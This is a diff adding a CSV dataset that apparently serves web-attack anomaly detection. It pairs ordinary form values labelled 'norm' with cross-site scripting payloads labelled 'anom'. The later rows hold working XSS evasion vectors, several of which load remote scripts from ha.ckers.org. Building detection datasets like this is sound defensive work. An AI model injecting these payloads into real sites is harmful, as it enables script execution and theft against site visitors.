@@ -1,0 +1,35 @@
+col0,col1,col2,col3
+c/ caridad s/n,14.0,norm,norm
+"campello, el",12.0,norm,norm
+40184,5.0,norm,norm
+1.44243E+15,16.0,norm,norm
+nue37,5.0,norm,norm
+nuda drudes,11.0,norm,norm
+tufts3@joll.rs,14.0,norm,norm
+22997112x,9.0,norm,norm
+"c/ del ferrocarril, 152,",24.0,norm,norm
+arenas de san juan,18.0,norm,norm
+19245,5.0,norm,norm
+2.07077E+15,16.0,norm,norm
+fennell,7.0,norm,norm
+d50allecido,11.0,norm,norm
+1902,4.0,norm,norm
+genny,5.0,norm,norm
+"<div style=""width: expression(alert('xss'));"">",46.0,xss,anom
+"<img style=""xss:expr/*xss*/ession(alert('xss'))"">",49.0,xss,anom
+"<xss style=""xss:expression(alert('xss'))"">",42.0,xss,anom
+"exp/*<xss style='no\\xss:noxss(""*//*"");",38.0,xss,anom
+"<object type=""text/x-scriptlet"" data=""http://ha.ckers.org/scriptlet.html""></object>",83.0,xss,anom
+"geturl(""javascript:alert('xss')"")",33.0,xss,anom
+"a=""get"";",8.0,xss,anom
+"<!--<value><![cdata[<xml id=i><x><c><![cdata[<img id=xss src=""javas<![cdata[cript:alert('xss');"">",97.0,xss,anom
+"<xml id=xss src=""http://ha.ckers.org/xsstest.xml"" id=i></xml>",61.0,xss,anom
+"<script id=xss src=""http://ha.ckers.org/xss.jpg""></script>",58.0,xss,anom
+<!--,,,
+<? echo('<scr)';,16.0,xss,anom
+"<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-alert('xss');+adw-/script+ad4-",127.0,xss,anom
+"<script a="">"" id=xss src=""http://ha.ckers.org/xss.js""></script>",63.0,xss,anom
+"<script a="">"" '' id=xss src=""http://ha.ckers.org/xss.js""></script>",66.0,xss,anom
+"<script ""a='>'"" id=xss src=""http://ha.ckers.org/xss.js""></script>",65.0,xss,anom
+"<script a=`>` id=xss src=""http://ha.ckers.org/xss.js""></script>",63.0,xss,anom
+"<script>document.write(""<scri"");</script>pt id=xss src=""http://ha.ckers.org/xss.js""></script>",93.0,xss,anom
